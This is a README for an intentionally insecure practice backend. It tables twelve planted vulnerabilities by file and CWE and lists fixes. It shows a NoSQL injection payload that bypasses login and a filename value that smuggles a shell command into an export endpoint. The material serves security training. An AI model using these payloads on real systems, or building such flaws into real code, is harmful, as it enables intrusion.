# Backend — Planted Vulnerabilities

**⚠️ Intentionally insecure code for security-testing practice. Do not deploy.**

| # | Vulnerability | File | CWE |
|---|---|---|---|
| 1 | NoSQL injection — auth bypass on login | `routes/auth.js` (`POST /login`) | CWE-943 |
| 2 | Plaintext password storage | `models/User.js`, `routes/auth.js` | CWE-256 |
| 3 | Hardcoded / fallback JWT secret | `routes/auth.js`, `middleware/auth.js`, `.env.example` | CWE-798 |
| 4 | No JWT expiry | `routes/auth.js` | CWE-613 |
| 5 | Missing authorization on `GET /api/tasks/:id` | `routes/tasks.js` | CWE-862 |
| 6 | IDOR on `GET /api/tasks/user/:userId` | `routes/tasks.js` | CWE-639 |
| 7 | OS command injection on `POST /api/tasks/export` | `routes/tasks.js` | CWE-78 |
| 8 | No output encoding on task description (sets up frontend stored XSS) | `models/Task.js` | CWE-79 |
| 9 | CORS wide open with credentials | `server.js` | CWE-942 |
| 10 | Verbose error responses (stack traces to client) | `server.js`, `routes/auth.js` | CWE-209 |
| 11 | Full user document (incl. password) returned on register/login | `routes/auth.js` | CWE-200 |
| 12 | No rate limiting on login | `routes/auth.js` | CWE-307 |

## Example exploit — #1, NoSQL injection auth bypass

```bash
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": null}}'
```

`{"$ne": null}` is interpreted as a MongoDB query operator, not a string, and
matches any non-null password — this logs in as `admin` with no password.

## Example exploit — #7, command injection

```bash
curl -X POST http://localhost:5000/api/tasks/export \
  -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
  -d '{"filename": "x; echo pwned > /tmp/pwned.txt #"}'
```

## Fixes

Each vulnerability is also commented inline in its source file with a `VULN:`
tag explaining the bug and the fix (hash passwords with `bcryptjs`, sanitize
query input, add `requireAuth` + ownership checks, replace `exec` with
`execFile` + an allow-list, restrict CORS `origin`, strip `password` from
responses, add `express-rate-limit`, etc.).
